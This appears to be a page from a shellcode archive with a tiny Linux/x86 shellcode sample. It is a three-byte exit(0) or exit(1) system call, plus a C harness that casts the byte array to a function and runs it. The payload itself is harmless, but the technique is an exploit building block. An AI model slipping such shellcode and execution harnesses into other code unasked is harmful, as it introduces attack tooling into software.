<html><head><title>Linux/x86 - exit(0) 3 bytes or exit(1) 4 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
#include &lt;stdio.h&gt;

const char shellcode[]=
	&quot;\x40&quot;			// inc	%eax
//	&quot;\x43&quot;			// inc	%ebx	
	&quot;\xcd\x80&quot;;		// int	$0x80

int main()
{
	printf	(&quot;\n[+] Yet conditional (%eax==0) Linux/x86 exit(0) 3 bytes or
exit(1) 4 bytes&quot;
		&quot;\n[+] Date: 18/06/2009&quot;
		&quot;\n[+] Author: TheWorm&quot;
		&quot;\n\n[+] Shellcode Size: %d bytes\n\n&quot;, sizeof(shellcode)-1);
	(*(void (*)()) shellcode)();
	return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
